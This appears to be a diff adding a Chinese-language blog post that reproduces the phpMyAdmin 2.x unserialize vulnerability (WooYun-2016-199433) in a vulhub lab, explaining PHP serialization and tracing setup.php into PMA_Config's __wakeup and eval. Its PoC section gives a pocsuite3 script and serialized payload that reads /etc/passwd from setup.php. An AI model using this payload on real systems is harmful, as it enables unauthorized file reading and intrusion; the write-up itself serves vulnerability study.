@@ -1,0 +1,363 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="0x00 介绍 phpMyadmin是一套开源的、基于Web的Mysql数据库管理工具。 0x01 环境vulhub项目之phpmyadmin&#x2F;WooYun-2016-199433 0x02 漏洞1、影响版本phpMyAdmin 2.x版本 2、漏洞摘要phpMyAdmin 2.x中存在的反序列化漏洞 通过该漏洞，可以任意读取文件或任意执行代码 0x03 分析1、原理分析1）什么是序列化">
+<meta property="og:type" content="article">
+<meta property="og:title" content="phpMyAdmin-WooYun-2016-199433">
+<meta property="og:url" content="https://rj45mp.github.io/phpMyAdmin-WooYun-2016-199433/index.html">
+<meta property="og:site_name" content="Rj45mp&#39;s blog">
+<meta property="og:description" content="0x00 介绍 phpMyadmin是一套开源的、基于Web的Mysql数据库管理工具。 0x01 环境vulhub项目之phpmyadmin&#x2F;WooYun-2016-199433 0x02 漏洞1、影响版本phpMyAdmin 2.x版本 2、漏洞摘要phpMyAdmin 2.x中存在的反序列化漏洞 通过该漏洞，可以任意读取文件或任意执行代码 0x03 分析1、原理分析1）什么是序列化">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://rj45mp.github.io/phpMyAdmin-WooYun-2016-199433/image-20200131205731076.png">
+<meta property="og:image" content="https://rj45mp.github.io/phpMyAdmin-WooYun-2016-199433/image-20200131210038460.png">
+<meta property="og:image" content="https://rj45mp.github.io/phpMyAdmin-WooYun-2016-199433/image-20200131213029320.png">
+<meta property="og:image" content="https://rj45mp.github.io/phpMyAdmin-WooYun-2016-199433/image-20200131213049438.png">
+<meta property="og:image" content="https://rj45mp.github.io/phpMyAdmin-WooYun-2016-199433/image-20200202223303906.png">
+<meta property="og:image" content="https://rj45mp.github.io/phpMyAdmin-WooYun-2016-199433/image-20200202223714461.png">
+<meta property="og:image" content="https://rj45mp.github.io/phpMyAdmin-WooYun-2016-199433/image-20200202223908512.png">
+<meta property="og:image" content="https://rj45mp.github.io/phpMyAdmin-WooYun-2016-199433/image-20200202230742678.png">
+<meta property="og:image" content="https://rj45mp.github.io/phpMyAdmin-WooYun-2016-199433/image-20200202232305893.png">
+<meta property="og:image" content="https://rj45mp.github.io/phpMyAdmin-WooYun-2016-199433/image-20200202234325901.png">
+<meta property="og:image" content="https://rj45mp.github.io/phpMyAdmin-WooYun-2016-199433/image-20200203001149313.png">
+<meta property="og:image" content="https://rj45mp.github.io/phpMyAdmin-WooYun-2016-199433/image-20200203001540766.png">
+<meta property="og:image" content="https://rj45mp.github.io/phpMyAdmin-WooYun-2016-199433/image-20200203022400050.png">
+<meta property="article:published_time" content="2020-01-31T12:36:32.000Z">
+<meta property="article:modified_time" content="2020-02-03T03:14:30.839Z">
+<meta property="article:author" content="Rj45mp">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://rj45mp.github.io/phpMyAdmin-WooYun-2016-199433/image-20200131205731076.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/Rj45mp.jpg">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/Rj45mp.jpg" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/Rj45mp.jpg">
+        
+      
+    
+    <!-- title -->
+    <title>phpMyAdmin-WooYun-2016-199433</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/firends/">Firends</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/phpMyAdmin-CVE-2018-12613/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/phpstudy-backdoor/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://rj45mp.github.io/phpMyAdmin-WooYun-2016-199433/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://rj45mp.github.io/phpMyAdmin-WooYun-2016-199433/&text=phpMyAdmin-WooYun-2016-199433"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://rj45mp.github.io/phpMyAdmin-WooYun-2016-199433/&title=phpMyAdmin-WooYun-2016-199433"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://rj45mp.github.io/phpMyAdmin-WooYun-2016-199433/&is_video=false&description=phpMyAdmin-WooYun-2016-199433"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=phpMyAdmin-WooYun-2016-199433&body=Check out this article: https://rj45mp.github.io/phpMyAdmin-WooYun-2016-199433/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://rj45mp.github.io/phpMyAdmin-WooYun-2016-199433/&title=phpMyAdmin-WooYun-2016-199433"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://rj45mp.github.io/phpMyAdmin-WooYun-2016-199433/&title=phpMyAdmin-WooYun-2016-199433"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://rj45mp.github.io/phpMyAdmin-WooYun-2016-199433/&title=phpMyAdmin-WooYun-2016-199433"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://rj45mp.github.io/phpMyAdmin-WooYun-2016-199433/&title=phpMyAdmin-WooYun-2016-199433"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://rj45mp.github.io/phpMyAdmin-WooYun-2016-199433/&name=phpMyAdmin-WooYun-2016-199433&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://rj45mp.github.io/phpMyAdmin-WooYun-2016-199433/&t=phpMyAdmin-WooYun-2016-199433"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.</span> <span class="toc-text">0x00 介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E7%8E%AF%E5%A2%83"><span class="toc-number">2.</span> <span class="toc-text">0x01 环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.</span> <span class="toc-text">0x02 漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="toc-number">3.1.</span> <span class="toc-text">1、影响版本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81%E6%BC%8F%E6%B4%9E%E6%91%98%E8%A6%81"><span class="toc-number">3.2.</span> <span class="toc-text">2、漏洞摘要</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E5%88%86%E6%9E%90"><span class="toc-number">4.</span> <span class="toc-text">0x03 分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90"><span class="toc-number">4.1.</span> <span class="toc-text">1、原理分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">4.2.</span> <span class="toc-text">2、漏洞分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-PoC"><span class="toc-number">5.</span> <span class="toc-text">0x04 PoC</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-%E6%80%9D%E8%80%83"><span class="toc-number">6.</span> <span class="toc-text">0x05 思考</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-%E5%8F%82%E8%80%83"><span class="toc-number">7.</span> <span class="toc-text">0x06 参考</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        phpMyAdmin-WooYun-2016-199433
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Rj45mp</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2020-01-31T12:36:32.000Z" itemprop="datePublished">2020-01-31</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="0x00-介绍"><a href="#0x00-介绍" class="headerlink" title="0x00 介绍"></a>0x00 介绍</h2><p> <code>phpMyadmin</code>是一套开源的、基于Web的Mysql数据库管理工具。</p>
+<h2 id="0x01-环境"><a href="#0x01-环境" class="headerlink" title="0x01 环境"></a>0x01 环境</h2><p>vulhub项目之phpmyadmin&#x2F;WooYun-2016-199433</p>
+<h2 id="0x02-漏洞"><a href="#0x02-漏洞" class="headerlink" title="0x02 漏洞"></a>0x02 漏洞</h2><h3 id="1、影响版本"><a href="#1、影响版本" class="headerlink" title="1、影响版本"></a>1、影响版本</h3><p>phpMyAdmin 2.x版本</p>
+<h3 id="2、漏洞摘要"><a href="#2、漏洞摘要" class="headerlink" title="2、漏洞摘要"></a>2、漏洞摘要</h3><p>phpMyAdmin 2.x中存在的反序列化漏洞</p>
+<p>通过该漏洞，可以任意读取文件或任意执行代码</p>
+<h2 id="0x03-分析"><a href="#0x03-分析" class="headerlink" title="0x03 分析"></a>0x03 分析</h2><h3 id="1、原理分析"><a href="#1、原理分析" class="headerlink" title="1、原理分析"></a>1、原理分析</h3><p>1）什么是序列化与反序列化</p>
+<p><img src="/phpMyAdmin-WooYun-2016-199433/image-20200131205731076.png" alt="image-20200131205731076"></p>
+<p><code>Student</code>类在实例化并传入变量值后形成<code>student1</code>对象。<br>在其他场景下可能会用到该实例，但如果一直保留不销毁等待下次调用的话，会造成浪费系统资源。<br>这时候，可以将对象序列化，成为一个字符串，当使用时候再反序列化出来。</p>
+<p>对于序列化后的字符串格式：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:7:&quot;Student&quot;:3:&#123;s:4:&quot;name&quot;;s:7:&quot;taoshen&quot;;s:3:&quot;sex&quot;;s:3:&quot;man&quot;;s:3:&quot;age&quot;;s:2:&quot;18&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>解析：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">O:7:&quot;Student&quot;:3: </span><br><span class="line">O是对象，A是数组。7是对象名字所占的字符。对象的名字。内含有3个变量。</span><br><span class="line"></span><br><span class="line">s:4:&quot;name&quot;;s:7:&quot;taoshen&quot;;s:3:&quot;sex&quot;;s:3:&quot;man&quot;;s:3:&quot;age&quot;;s:2:&quot;18&quot;:</span><br><span class="line">变量的数据类型，s为string,i为int。然后为变量名所占的字符长度，然后是变量的值，和其长度。</span><br></pre></td></tr></table></figure>
+
+<p>这是反序列化出来的对象：</p>
+<p><img src="/phpMyAdmin-WooYun-2016-199433/image-20200131210038460.png" alt="image-20200131210038460"></p>
+<p>2）什么是反序列化漏洞</p>
+<p>php底层定义了一序列以<code>__</code>开头的magic函数，这些magic函数在对象从建立到销毁的过程会自动触发执行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">__construce()当一个对象创建时被调用</span><br><span class="line">__destruct()当一个对象销毁时被调用</span><br><span class="line">__toString()当一个对象被当作一个字符串使用</span><br><span class="line">__sleep()在对象在被序列化之前运行</span><br><span class="line">__wakeup()在序列化之后立即被调用</span><br></pre></td></tr></table></figure>
+
+<p>在通过<code>unserialize</code>函数反序列化对象的过程中，如果这些magic函数存在输入点，并且对输入的数据没有进行严格的过滤，那么就很容易造成反序列化漏洞。</p>
+<p>3）反序列化漏洞样例</p>
+<p>一道CTF题目</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test2.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;shield.php&quot;</span>);</span><br><span class="line"><span class="variable">$x</span> = <span class="keyword">new</span> <span class="title class_">Shield</span>();</span><br><span class="line"><span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;class&#x27;</span>]) &amp;&amp; <span class="variable">$g</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;class&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$g</span>))&#123;</span><br><span class="line">    <span class="variable">$x</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$g</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$x</span> -&gt; <span class="title function_ invoke__">readfile</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//shield.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">//flag is in pctf.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Shield</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construce</span>(<span class="params"><span class="variable">$filename</span> = <span class="string">&#x27;&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span> -&gt; file = <span class="variable">$filename</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">readfile</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable language_">$this</span> -&gt; file) &amp;&amp; <span class="title function_ invoke__">stripos</span>(<span class="variable">$this</span> -&gt; file,<span class="string">&#x27;..&#x27;</span>) === <span class="literal">FALSE</span> &amp;&amp; <span class="title function_ invoke__">stripos</span>(<span class="variable">$this</span> -&gt; file,<span class="string">&#x27;/&#x27;</span>) === <span class="literal">FALSE</span> &amp;&amp; <span class="title function_ invoke__">stripos</span>(<span class="variable">$this</span> -&gt; file,<span class="string">&#x27;//&#x27;</span>) === <span class="literal">FALSE</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> @<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span> -&gt; file);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>在test2.php中，存在输入点class，对输入的数据进行反序列化，如果成功则执行<code>readfile</code>函数，<code>readfile</code>函数在防止目录穿越后，如果通过则通过<code>file_get_contents</code>函数读取目标。根据注释提示，目标为pctf.php文件。</p>
+<p>显而易见，这里构造对象，传入变量为<code>pctf.php</code>即可读取flag：</p>
+<p><img src="/phpMyAdmin-WooYun-2016-199433/image-20200131213029320.png" alt="image-20200131213029320"></p>
+<p><img src="/phpMyAdmin-WooYun-2016-199433/image-20200131213049438.png" alt="image-20200131213049438"></p>
+<h3 id="2、漏洞分析"><a href="#2、漏洞分析" class="headerlink" title="2、漏洞分析"></a>2、漏洞分析</h3><p>1）输入点</p>
+<p>在setup.php中，存在输入变量<code>configuration</code>,该变量会被<code>unserialize</code>函数进行反序列化操作：</p>
+<p><img src="/phpMyAdmin-WooYun-2016-199433/image-20200202223303906.png" alt="image-20200202223303906"></p>
+<p>当通过该输入点传入一个序列化字符串的时候，会经反序列化出来一个对象。</p>
+<p>在这个对象从创建到销毁的过程中，会自动触发某些魔法函数。</p>
+<p>2）控制点</p>
+<p>setup.php通过<code>require_once</code>函数引入了<code>/librarise/common.lib.php</code>文件：</p>
+<p><img src="/phpMyAdmin-WooYun-2016-199433/image-20200202223714461.png" alt="image-20200202223714461"></p>
+<p>而<code>/librarise/common.lib.php</code>又引入了<code>/librarise/Config.class.php</code></p>
+<p><img src="/phpMyAdmin-WooYun-2016-199433/image-20200202223908512.png" alt="image-20200202223908512"></p>
+<p>在<code>/librarise/Config.class.php</code>中存在魔法函数<code>__wakeup</code>，该魔法函数在对象被序列化之后立即被触发调用：</p>
+<p><img src="/phpMyAdmin-WooYun-2016-199433/image-20200202230742678.png" alt="image-20200202230742678"></p>
+<p>可以看到，其内在满足条件后，会调用<code>load()</code>函数。继续跟踪<code>load()</code>函数：</p>
+<p><img src="/phpMyAdmin-WooYun-2016-199433/image-20200202232305893.png" alt="image-20200202232305893"></p>
+<p>当检测到<code>file_get_contents</code>被定义，则通过<code>eval</code>函数执行读入的字符串；如果没有<code>file_get_contents</code>函数，则通过<code>file</code>读入文件，同时利用<code>implode</code>函数把文件内容利用<code>\n</code>拼接，再执行<code>eval</code>函数。</p>
+<p>如下：</p>
+<p><img src="/phpMyAdmin-WooYun-2016-199433/image-20200202234325901.png" alt="image-20200202234325901"></p>
+<p>3）利用点</p>
+<p>通过分析可以清楚，在输入点位置，当我们构造特定的序列化的数据，在被反序列化成对象后，会到达控制点，触发<code>__wakeup</code>魔法函数。当特定的序列化的数据满足控制点中的<code>load</code>函数的<code>if</code>分支中的条件后，则可以进行任意读取文件或者任意执行代码。</p>
+<p>接下来就是回顾跟踪需要满足的字段和构造特定的序列化数据：</p>
+<p>在输入点位置<code>setup.php</code>中，需要具备2个传参字段<code>action和configuration</code>，同时创建了<code>$PMA_Config = new PMA_Config();</code></p>
+<p>而在控制点的<code>load</code>函数中，则只需要传入形参<code>source</code>和对应的特定数据即可。</p>
+<p>任意读取文件：</p>
+<p><img src="/phpMyAdmin-WooYun-2016-199433/image-20200203001149313.png" alt="image-20200203001149313"></p>
+<p><img src="/phpMyAdmin-WooYun-2016-199433/image-20200203001540766.png" alt="image-20200203001540766"></p>
+<p>任意执行代码，在本环境Ubuntu下无法写入webshell到日志文件，具体写法详见参考链接</p>
+<h2 id="0x04-PoC"><a href="#0x04-PoC" class="headerlink" title="0x04 PoC"></a>0x04 PoC</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pocsuite3.api <span class="keyword">import</span> Output,POCBase,register_poc,requests</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BackDoor</span>(<span class="title class_ inherited__">POCBase</span>):</span><br><span class="line">    vulID=<span class="string">&#x27;1&#x27;</span></span><br><span class="line">    version=<span class="string">&#x27;1&#x27;</span></span><br><span class="line">    author=<span class="string">&#x27;Rj45mp&#x27;</span></span><br><span class="line">    vulDate=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    createDate=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    updateDate=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    references=[<span class="string">&#x27;&#x27;</span>]</span><br><span class="line">    name=<span class="string">&#x27;phpMyAdmin&#x27;</span></span><br><span class="line">    appPowerLink=<span class="string">&#x27;test&#x27;</span></span><br><span class="line">    appName=<span class="string">&#x27;phpMyAdmin&#x27;</span></span><br><span class="line">    appVersion=<span class="string">&#x27;2.x&#x27;</span></span><br><span class="line">    vulType=<span class="string">&#x27;un&amp;serialization&#x27;</span></span><br><span class="line">    desc=<span class="string">&#x27;un&amp;serialization&#x27;</span></span><br><span class="line">    samples=[<span class="string">&#x27;http://127.0.0.1&#x27;</span>]</span><br><span class="line">    install_requires=[]</span><br><span class="line">    pocDesc=<span class="string">&#x27;Rj45mp for test.&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_verify</span>(<span class="params">self</span>):</span><br><span class="line">        result=&#123;&#125;</span><br><span class="line">        target=self.url+<span class="string">&quot;/scripts/setup.php&quot;</span></span><br><span class="line">        payload=&#123;</span><br><span class="line">          <span class="string">&quot;action&quot;</span>:<span class="string">&quot;test&quot;</span>,</span><br><span class="line">          <span class="string">&quot;configuration&quot;</span>:<span class="string">&#x27;O:10:&quot;PMA_Config&quot;:1:&#123;s:6:&quot;source&quot;,s:11:&quot;/etc/passwd&quot;;&#125;&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        req=requests.post(target,data=payload)</span><br><span class="line">        res = req.text</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&quot;root&quot;</span> <span class="keyword">in</span> res):</span><br><span class="line">            result[<span class="string">&#x27;VerifyInfo&#x27;</span>]=&#123;&#125;</span><br><span class="line">            result[<span class="string">&#x27;VerifyInfo&#x27;</span>][<span class="string">&#x27;URL&#x27;</span>]=target</span><br><span class="line">        <span class="keyword">return</span> self.parse_output</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_attack</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self._verify()</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">parse_output</span>(<span class="params">self,result</span>):</span><br><span class="line">        output=Output(self)</span><br><span class="line">        <span class="keyword">if</span> result:</span><br><span class="line">            output.success(result)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            output.fail(<span class="string">&#x27;target is not vulnerable.&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> output</span><br><span class="line">register_poc(BackDoor)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/phpMyAdmin-WooYun-2016-199433/image-20200203022400050.png" alt="image-20200203022400050"></p>
+<h2 id="0x05-思考"><a href="#0x05-思考" class="headerlink" title="0x05 思考"></a>0x05 思考</h2><p>感觉可以大致将漏洞的一些复现分析分为输入点、漏洞点、控制点、条件点以及利用点。</p>
+<h2 id="0x06-参考"><a href="#0x06-参考" class="headerlink" title="0x06 参考"></a>0x06 参考</h2><p> <a target="_blank" rel="noopener" href="https://docs.ioin.in/writeup/www.mottoin.com/4cb63e7c-9151-42da-a5bd-e6e29e7ff2f8/index.html">https://docs.ioin.in/writeup/www.mottoin.com/4cb63e7c-9151-42da-a5bd-e6e29e7ff2f8/index.html</a> </p>
+<p> <a href="https://rj45mp.github.io/%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%B9%8B%E5%8C%85%E5%90%AB%E6%97%A5%E5%BF%97%E8%8E%B7%E5%8F%96webshell/">https://rj45mp.github.io/%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%B9%8B%E5%8C%85%E5%90%AB%E6%97%A5%E5%BF%97%E8%8E%B7%E5%8F%96webshell/</a> </p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/firends/">Firends</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.</span> <span class="toc-text">0x00 介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E7%8E%AF%E5%A2%83"><span class="toc-number">2.</span> <span class="toc-text">0x01 环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.</span> <span class="toc-text">0x02 漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="toc-number">3.1.</span> <span class="toc-text">1、影响版本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81%E6%BC%8F%E6%B4%9E%E6%91%98%E8%A6%81"><span class="toc-number">3.2.</span> <span class="toc-text">2、漏洞摘要</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E5%88%86%E6%9E%90"><span class="toc-number">4.</span> <span class="toc-text">0x03 分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90"><span class="toc-number">4.1.</span> <span class="toc-text">1、原理分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">4.2.</span> <span class="toc-text">2、漏洞分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-PoC"><span class="toc-number">5.</span> <span class="toc-text">0x04 PoC</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-%E6%80%9D%E8%80%83"><span class="toc-number">6.</span> <span class="toc-text">0x05 思考</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-%E5%8F%82%E8%80%83"><span class="toc-number">7.</span> <span class="toc-text">0x06 参考</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
